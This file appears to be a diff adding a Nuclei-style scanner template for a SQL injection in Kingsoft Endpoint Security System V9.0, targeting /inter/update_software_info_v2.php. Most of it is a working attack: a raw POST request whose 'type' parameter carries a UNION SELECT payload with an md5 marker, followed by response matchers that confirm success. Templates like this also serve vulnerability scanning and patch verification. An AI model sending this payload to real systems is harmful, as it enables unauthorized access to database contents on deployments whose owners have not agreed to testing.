@@ -1,0 +1,29 @@
+id: kingsoft-endpoint-v9-sql-injection
+
+info:
+  name: "金山终端安全系统V9.0 update_software_info_v2.php SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    金山终端安全系统V9.0 存在 SQL 注入漏洞，攻击者可通过构造恶意 SQL 语句获取数据库敏感信息。
+  tags: 金山终端安全系统
+
+http:
+- raw:
+  - |
+    POST /inter/update_software_info_v2.php HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+
+    type=-100+UNION+SELECT+1,md5(078674232),1,1,1,1,1,1--&key=&pageCount=0&curPage=
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'software_list'
